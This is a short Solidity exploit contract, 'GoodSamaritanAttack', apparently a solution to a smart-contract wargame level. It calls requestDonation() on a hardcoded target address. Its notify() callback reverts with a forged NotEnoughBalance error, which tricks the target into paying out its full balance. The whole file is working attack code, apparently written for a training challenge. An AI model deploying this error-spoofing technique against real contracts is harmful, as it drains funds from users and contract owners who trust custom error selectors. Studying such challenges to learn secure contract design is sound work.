// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

interface GoodSamaritan {
    function requestDonation() external returns(bool enoughBalance);
}

contract GoodSamaritanAttack {
    GoodSamaritan gAddr = GoodSamaritan(0x19eBAE64B1892719c6996016bd9Fee9DBFd10EC5);

    error NotEnoughBalance();
    
    function callMe() external  {
        gAddr.requestDonation();
    }
    
    bool entered = false;
    
    function notify(uint256 amount) external pure {
        if (amount <= 10) {
                revert NotEnoughBalance();
            }
        }

}
